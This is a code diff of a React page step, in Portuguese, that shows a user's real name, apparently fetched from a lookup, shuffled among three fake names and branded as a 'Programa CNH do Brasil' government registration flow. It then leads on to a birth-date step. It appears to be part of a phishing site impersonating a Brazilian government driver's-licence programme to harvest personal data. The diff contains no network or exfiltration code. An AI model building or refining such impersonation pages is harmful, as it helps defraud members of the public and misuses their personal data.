@@ -1,75 +1,87 @@
 import { useLocation, useNavigate } from "react-router-dom";
-import { useState } from "react";
 import "./StepName.css";
 
-export default function StepName() {
+export default function StepName(){
 
   const location = useLocation();
   const navigate = useNavigate();
+
   const data = location.state;
 
-  const [selected, setSelected] = useState(null);
+  if(!data) return <div>Carregando...</div>;
 
-  if (!data) return <div className="step-loading">Carregando...</div>;
+  const nomeReal = data.dados.nome;
 
-  // Nome real vindo da API
-  const realName = data.nome;
-
-  // Outras opções falsas
-  const options = [
-    realName,
+  const nomes = [
+    nomeReal,
     "MARIA PEREIRA COSTA",
     "CIRO JOSE DE OLIVEIRA NETO",
     "ALICE SANTOS RIBEIRO"
   ].sort(() => Math.random() - 0.5);
 
-  const handleConfirm = () => {
+  const selecionarNome = (nome) => {
 
-    if (!selected) return;
-
-    navigate("/nascimento", {
-      state: data
+    navigate("/stepbirth",{
+      state:{
+        ...data,
+        nomeSelecionado:nome
+      }
     });
-  };
 
-  return (
-    <div className="gov-page">
+  }
+
+  return(
+
+    <div className="gov-container">
 
       <div className="gov-header">
-        <img src="/logo2.png" alt="Logo" />
+
+        <img
+          src="/logo2.png"
+          className="gov-logo"
+        />
+
+        <div className="gov-title">
+          Programa CNH do Brasil
+        </div>
+
       </div>
 
-      <div className="gov-container">
+      <div className="gov-card">
 
-        <h2 className="gov-title">
+        <h2>
           Confirme seus dados para o cadastro no Programa CNH do Brasil
         </h2>
 
         <div className="gov-step">
-          <div className="gov-step-number">1</div>
-          <div className="gov-question">
+
+          <div className="step-circle">
+            1
+          </div>
+
+          <div className="step-title">
             Qual é seu nome completo?
           </div>
+
         </div>
 
-        <div className="gov-options">
+        <div className="name-list">
 
-          {options.map((name, index) => (
+          {nomes.map((nome,i)=>(
             <div
-              key={index}
-              className={`gov-option ${selected === name ? "active" : ""}`}
-              onClick={() => setSelected(name)}
+              key={i}
+              className="name-item"
+              onClick={()=>selecionarNome(nome)}
             >
-              {name}
+              {nome}
             </div>
           ))}
 
         </div>
 
         <button
-          className="gov-button"
-          disabled={!selected}
-          onClick={handleConfirm}
+          className="confirm-btn"
+          onClick={()=>selecionarNome(nomeReal)}
         >
           Confirmar
         </button>
@@ -77,5 +89,7 @@ export default function StepName() {
       </div>
 
     </div>
-  );
+
+  )
+
 }
